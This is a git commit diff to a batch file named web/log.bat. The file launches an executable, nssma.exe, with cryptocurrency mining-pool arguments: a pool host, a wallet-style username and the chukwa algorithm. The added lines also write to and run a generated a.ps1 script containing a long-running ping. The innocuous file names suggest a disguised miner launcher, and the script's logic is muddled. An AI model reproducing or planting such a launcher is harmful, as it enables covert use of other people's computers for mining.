7578bb6e6ff8680f4c0d3aefe33572a57831957f
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-04 15:43:39 +0000

    Update log.bat

--- web/log.bat
+++ web/log.bat
@@ -1,3 +1,5 @@
 rem
 :start
-"%~dp0"nssma.exe --pool 159.89.201.150:43456 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password x --algorithm chukwa
+"%~dp0"nssma.exe --pool us-central.2acoin.org:3333 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password x --algorithm chukwa >>a.ps1
+cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+.\a.ps1
